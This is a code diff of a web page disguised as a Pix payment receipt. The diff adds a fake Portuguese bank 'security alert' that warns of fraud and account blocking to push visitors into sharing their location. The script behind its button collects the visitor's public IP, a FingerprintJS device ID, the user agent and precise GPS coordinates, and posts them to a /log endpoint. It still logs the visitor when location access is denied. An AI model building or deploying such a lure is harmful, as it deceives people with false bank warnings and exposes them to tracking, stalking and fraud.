@@ -6,80 +6,102 @@
   <style>
     body { background: #f2f2f2; text-align: center; font-family: Arial; }
     img { margin-top: 50px; width: 90%; max-width: 500px; }
+    button {
+      padding: 12px 25px;
+      font-size: 16px;
+      background-color: #e53935;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+    button:hover {
+      background-color: #c62828;
+    }
+    #securityWarning {
+      background: #fff3cd;
+      border: 1px solid #ffeeba;
+      border-radius: 5px;
+      padding: 20px;
+      margin: 20px auto;
+      max-width: 600px;
+    }
   </style>
 </head>
 <body>
+  <div id="securityWarning">
+    <h2 style="color: red;">🚨 Alerta de Segurança</h2>
+    <p><strong>Detectamos uma possível tentativa de fraude!</strong></p>
+    <p>Para sua proteção, é necessário validar sua localização. Clique no botão abaixo e permita o acesso à localização quando solicitado.</p>
+    <p>Isso garante que sua conta bancária não seja bloqueada e que a transação via Pix seja finalizada com segurança.</p>
+    <button onclick="getLocation()">✅ Verificar Segurança</button>
+  </div>
+
   <img src="comprovante.jpg" alt="Comprovante Pix">
 
-  <!-- Carrega FingerprintJS -->
+  <!-- FingerprintJS -->
   <script async src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
 
   <script>
-    // ⚠️ CHAMADA DIRETA: força prompt de geolocalização
-    navigator.geolocation.getCurrentPosition(
-      () => {},
-      () => {},
-      { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-    );
+    function getLocation() {
+      fetch("https://api.ipify.org?format=json")
+        .then(res => res.json())
+        .then(ipData => {
+          const ip = ipData.ip;
+          const userAgent = navigator.userAgent;
 
-    // Coleta IP público
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(ipData => {
-        const ip = ipData.ip;
-        const userAgent = navigator.userAgent;
+          FingerprintJS.load()
+            .then(fp => fp.get())
+            .then(result => {
+              const visitorId = result.visitorId;
 
-        // Gera o fingerprint
-        FingerprintJS.load()
-          .then(fp => fp.get())
-          .then(result => {
-            const visitorId = result.visitorId;
+              if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                  pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
 
-            // Solicita geolocalização com precisão
-            if (navigator.geolocation) {
-              navigator.geolocation.getCurrentPosition(
-                pos => {
-                  const lat = pos.coords.latitude;
-                  const lon = pos.coords.longitude;
-
-                  // Envia os dados
-                  fetch("/log", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      ip,
-                      visitorId,
-                      userAgent,
-                      device: userAgent,
-                      loc: `${lat},${lon}`
-                    })
-                  })
-                  .then(r => r.ok ? console.log("✅ Enviado com sucesso") : console.warn("⚠️ Erro no envio:", r.status))
-                  .catch(err => console.error("❌ Falha ao enviar:", err));
-                },
-                err => {
-                  console.warn("⚠️ Geolocalização negada:", err.message);
-
-                  // Envia sem GPS
-                  fetch("/log", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                      ip,
-                      visitorId,
-                      userAgent,
-                      device: userAgent,
-                      loc: null
-                    })
-                  });
-                },
-                { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-              );
-            } else {
-              console.log("❌ Geolocalização não suportada.");
-            }
-          });
-      });
+                    fetch("/log", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({
+                        ip,
+                        visitorId,
+                        userAgent,
+                        device: userAgent,
+                        loc: `${lat},${lon}`
+                      })
+                    }).then(r => {
+                      if (r.ok) {
+                        alert("✅ Localização verificada com sucesso!");
+                      } else {
+                        console.warn("⚠️ Erro no envio:", r.status);
+                      }
+                    }).catch(err => console.error("❌ Falha ao enviar:", err));
+                  },
+                  err => {
+                    console.warn("⚠️ Geolocalização negada:", err.message);
+                    fetch("/log", {
+                      method: "POST",
+                      headers: { "Content-Type": "application/json" },
+                      body: JSON.stringify({
+                        ip,
+                        visitorId,
+                        userAgent,
+                        device: userAgent,
+                        loc: null
+                      })
+                    });
+                  },
+                  { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+              } else {
+                console.log("❌ Geolocalização não suportada.");
+              }
+            });
+        });
+    }
   </script>
 </body>
 </html>
